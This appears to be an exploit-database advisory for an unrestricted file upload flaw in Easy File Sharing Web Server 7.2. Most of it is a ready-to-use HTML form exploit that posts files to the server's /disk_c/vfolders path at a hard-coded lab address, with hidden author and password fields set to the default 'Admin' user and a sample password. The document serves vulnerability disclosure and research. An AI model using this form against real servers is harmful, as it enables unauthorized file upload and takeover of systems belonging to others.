##################################
#   2017/6/15  Chako
#  
#   EFS Web Server 7.2 Unrestricted File Upload
#   Vendor Homepage: http://www.sharing-file.com
#   Software Link: https://www.exploit-db.com/apps/60f3ff1f3cd34dec80fba130ea481f31-efssetup.exe
#   Version: Easy File Sharing Web Server 7.2
#   Tested on: WinXP SP3
##################################




EFS Web Server 7.2 allows unauthorized users to upload malicious files





[Exploit]

// action="http://target_host/disk_c/vfolders
// </script><input size="20" name="upload_author" value="Admin" type="hidden"> 
// have to know the user name by Default "Admin"



<form action="http://192.168.136.129/disk_c/vfolders" name="post" onsubmit="return input(this)" enctype="multipart/form-data" method="post">
<input name="uploadid" id="uploadid" value="34533689" type="hidden">
          <center>
            <a name="reply"></a> 
            <table class="forumline" cellpadding="6" width="479">
              <tbody><tr bgcolor="#8080A6"> 
                <td bgcolor="#eff2f8" height="319"> 
                  <center>

<script language="JavaScript">
<!--
document.write('<input type="hidden" size="20" name="upload_author" Value="'+ReadCookie("UserID")+'">');
// -->
</script><input size="20" name="upload_author" value="Admin" type="hidden"> 
<script language="JavaScript">
<!--
document.write('<input type="hidden" size="20" name="upload_passwd" Value="'+ReadCookie("PassWD")+'">');
// --></script><input size="20" name="upload_passwd" value="829700" type="hidden"> 

                    <table cellpadding="0" border="0" width="437">
                      <tbody><tr> 
                        <td colspan="2" height="63"> <span class="bgen">Description:</span> <br> 
                          <input name="upload_title" id="upload_title" size="50" value="dd" type="text">
                          </td>
                      </tr>
                      <tr> 
                        <td colspan="2"><span class="bgen">File:</span> <br>
                          <input name="UploadedFile" id="UploadedFile" size="50" type="file">
                          <br> </td>
                      </tr>
                      <tr>
</tr>
<tr>
 
                        <td colspan="2" height="40"><font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF"> 
                          <input name="Upload" class="button" value="Upload" type="submit">
                          </font> 

                      </td>
                      </tr>
                    </tbody></table>
                  </center></td>
              </tr>
            </tbody></table>
            
          </center>
        </form> 
		[/Exploit]